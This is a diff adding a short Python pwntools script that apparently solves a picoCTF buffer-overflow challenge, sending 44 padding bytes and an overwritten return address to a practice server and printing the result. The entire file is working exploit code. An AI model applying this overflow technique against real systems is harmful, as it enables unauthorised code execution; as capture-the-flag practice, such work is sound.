@@ -1,0 +1,11 @@
+#!/usr/bin/env python3
+from pwn import *
+
+payload = b"A"*44 + p32(0x80491f6)  # Little endian: b'\xf6\x91\x04\x08'
+host, port = "saturn.picoctf.net", [PORT]
+
+p = remote(host, port)      # Opens the connection
+log.info(p.recvS())         # Decodes/prints "Please enter your string:"
+p.sendline(payload)         # Sends the payload
+log.success(p.recvallS())   # Decodes/prints all program outputs
+p.close()                   # Closes the connection
